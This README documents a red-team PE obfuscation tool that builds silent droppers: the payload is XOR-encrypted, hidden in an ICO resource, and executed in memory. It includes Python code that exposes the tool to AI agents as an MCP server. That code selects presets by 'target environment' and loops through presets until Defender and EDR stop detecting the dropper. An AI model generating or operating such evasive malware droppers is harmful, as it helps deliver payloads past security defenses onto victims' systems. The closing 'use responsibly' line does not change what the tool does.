# Rusty Dropper - PE Obfuscation Pipeline

A modular PE obfuscation suite for red teamers, designed for stealth, efficiency, and evasion. This tool creates obfuscated dropper executables that embed encrypted PE files in ICO resources and execute them at runtime.

## Overview

The Rusty Dropper pipeline processes PE files through configurable obfuscation steps, creating stealthy dropper executables that evade static analysis and signature-based detection. The pipeline supports multiple obfuscation presets and can be integrated into automated workflows.

## Pipeline Architecture

### Available Obfuscation Presets

1. **Minimal**: Basic XOR encryption + ICO embedding
2. **Stealth**: Pre-junk + section interleaving + encryption + post-junk + ICO
3. **Maximum**: Multiple encryption rounds + extensive junk data + ICO

### Obfuscation Techniques

- **Junk Data Injection**: Random bytes added before/after PE data
- **Section Interleaving**: Junk inserted between PE sections to disrupt analysis
- **XOR Encryption**: Simple but effective payload obfuscation
- **ICO Resource Embedding**: Proper ICO structure with embedded encrypted data
- **Multiple Encryption Rounds**: Repeatable obfuscation steps for enhanced security

## Usage

### Command Line Interface

```bash
# Create droppers with different obfuscation levels
make droppers           # Minimal obfuscation
make droppers-stealth   # Stealth obfuscation
make droppers-maximum   # Maximum obfuscation

# Or use cargo directly
cargo run --bin build-droppers minimal samples out
cargo run --bin build-droppers stealth samples out
cargo run --bin build-droppers maximum samples out
```

### Python AI Agent Integration with MCP Tools

This pipeline is designed to be integrated into Python AI agent workflows using MCP (Model Context Protocol) tools. Here's how to effectively use it:

#### 1. **MCP Tool Integration**

```python
# Example MCP tool integration
import subprocess
import os
from pathlib import Path

class PEObfuscationTool:
    def __init__(self, project_root: str):
        self.project_root = Path(project_root)
        self.samples_dir = self.project_root / "samples"
        self.output_dir = self.project_root / "out"

    def create_obfuscated_dropper(self,
                                pe_file: str,
                                preset: str = "stealth",
                                output_name: str = None) -> str:
        """
        Create an obfuscated dropper executable

        Args:
            pe_file: Path to PE file to obfuscate
            preset: Obfuscation preset (minimal, stealth, maximum)
            output_name: Optional custom output name

        Returns:
            Path to generated dropper executable
        """
        # Ensure samples directory exists
        self.samples_dir.mkdir(exist_ok=True)
        self.output_dir.mkdir(exist_ok=True)

        # Copy PE file to samples directory
        pe_path = Path(pe_file)
        sample_path = self.samples_dir / pe_path.name
        import shutil
        shutil.copy2(pe_path, sample_path)

        # Run obfuscation pipeline
        cmd = [
            "cargo", "run", "--bin", "build-droppers",
            preset, str(self.samples_dir), str(self.output_dir)
        ]

        result = subprocess.run(cmd, cwd=self.project_root,
                              capture_output=True, text=True)

        if result.returncode != 0:
            raise RuntimeError(f"Obfuscation failed: {result.stderr}")

        # Return path to generated dropper
        output_file = self.output_dir / pe_path.name
        return str(output_file)
```

#### 2. **AI Agent Workflow Integration**

```python
# Example AI agent workflow
class RedTeamAgent:
    def __init__(self):
        self.pe_obfuscator = PEObfuscationTool("/path/to/rusty-dropper")

    def generate_stealth_payload(self, payload_path: str, target_env: str):
        """
        Generate a stealth payload for specific target environment
        """
        # Select obfuscation preset based on target environment
        preset_map = {
            "enterprise": "maximum",    # High-security environments
            "consumer": "stealth",     # Standard consumer systems
            "legacy": "minimal"        # Older systems with limited detection
        }

        preset = preset_map.get(target_env, "stealth")

        # Generate obfuscated dropper
        dropper_path = self.pe_obfuscator.create_obfuscated_dropper(
            payload_path, preset
        )

        return {
            "dropper_path": dropper_path,
            "obfuscation_level": preset,
            "target_environment": target_env,
            "evasion_techniques": self._get_evasion_techniques(preset)
        }

    def _get_evasion_techniques(self, preset: str) -> list:
        """Return list of evasion techniques used by preset"""
        techniques = {
            "minimal": ["XOR encryption", "ICO embedding"],
            "stealth": ["Pre-junk injection", "Section interleaving",
                       "XOR encryption", "Post-junk injection", "ICO embedding"],
            "maximum": ["Extensive pre-junk", "Section interleaving",
                       "Multiple encryption rounds", "Extensive post-junk", "ICO embedding"]
        }
        return techniques.get(preset, [])
```

#### 3. **MCP Tool Server Implementation**

```python
# MCP tool server for PE obfuscation
from mcp import McpServer
import json

class PEObfuscationMCPServer(McpServer):
    def __init__(self):
        super().__init__("pe-obfuscation")
        self.obfuscator = PEObfuscationTool("/path/to/rusty-dropper")

    @self.tool("create_obfuscated_dropper")
    def create_obfuscated_dropper(self,
                                pe_file: str,
                                preset: str = "stealth",
                                output_name: str = None) -> str:
        """
        Create an obfuscated dropper executable using the PE obfuscation pipeline

        Args:
            pe_file: Path to PE file to obfuscate
            preset: Obfuscation preset (minimal, stealth, maximum)
            output_name: Optional custom output name

        Returns:
            JSON with dropper path and metadata
        """
        try:
            dropper_path = self.obfuscator.create_obfuscated_dropper(
                pe_file, preset, output_name
            )

            return json.dumps({
                "success": True,
                "dropper_path": dropper_path,
                "preset_used": preset,
                "evasion_techniques": self.obfuscator._get_evasion_techniques(preset)
            })
        except Exception as e:
            return json.dumps({
                "success": False,
                "error": str(e)
            })
```

#### 4. **Best Practices for AI Agent Integration**

1. **Environment Detection**: Use different obfuscation presets based on target environment
2. **Iterative Obfuscation**: Test multiple presets and select based on detection results
3. **Metadata Tracking**: Maintain records of obfuscation techniques used for each payload
4. **Error Handling**: Implement robust error handling for pipeline failures
5. **Resource Management**: Clean up temporary files and manage disk space

#### 5. **Integration with Detection Testing**

```python
# Example integration with detection testing
def test_obfuscation_effectiveness(dropper_path: str, detection_tools: list):
    """
    Test obfuscated dropper against various detection tools
    """
    results = {}

    for tool in detection_tools:
        # Run detection tool against dropper
        detection_result = run_detection_tool(tool, dropper_path)
        results[tool] = detection_result

    return results

# Usage in AI agent workflow
def adaptive_obfuscation(payload_path: str, target_env: str):
    """
    Adaptively select obfuscation based on detection testing
    """
    presets = ["minimal", "stealth", "maximum"]

    for preset in presets:
        dropper = pe_obfuscator.create_obfuscated_dropper(payload_path, preset)
        detection_results = test_obfuscation_effectiveness(dropper, ["defender", "edr"])

        if all(not result["detected"] for result in detection_results.values()):
            return dropper, preset

    # If all presets detected, return maximum obfuscation
    return dropper, "maximum"
```

## Technical Details

### Pipeline Processing Flow

1. **Input**: PE file to obfuscate
2. **Obfuscation**: Apply selected preset pipeline steps
3. **ICO Creation**: Generate proper ICO structure with embedded data
4. **Dropper Generation**: Create Rust dropper executable
5. **Resource Embedding**: Embed ICO as Windows resource
6. **Output**: Ready-to-deploy dropper executable

### Dropper Runtime Behavior

- **Silent Execution**: No console output or error messages
- **Resource Extraction**: Loads embedded ICO resource using Windows API
- **Data Decryption**: XOR decrypts embedded PE data
- **Memory Execution**: Allocates executable memory and runs payload
- **Error Handling**: Graceful failure with early returns

## Security Considerations

- **OpSec**: Designed for operational security and evasion
- **Stealth**: Minimal binary size and signature avoidance
- **Modularity**: Easy to swap obfuscation techniques
- **Low-level Control**: Direct memory manipulation and system API usage

## Dependencies

- Rust toolchain with Windows target support
- `windows-sys` for Windows API bindings
- `winres` for resource embedding
- `rand` for random data generation

This tool is designed for red team operations and security research. Use responsibly and in accordance with applicable laws and regulations.
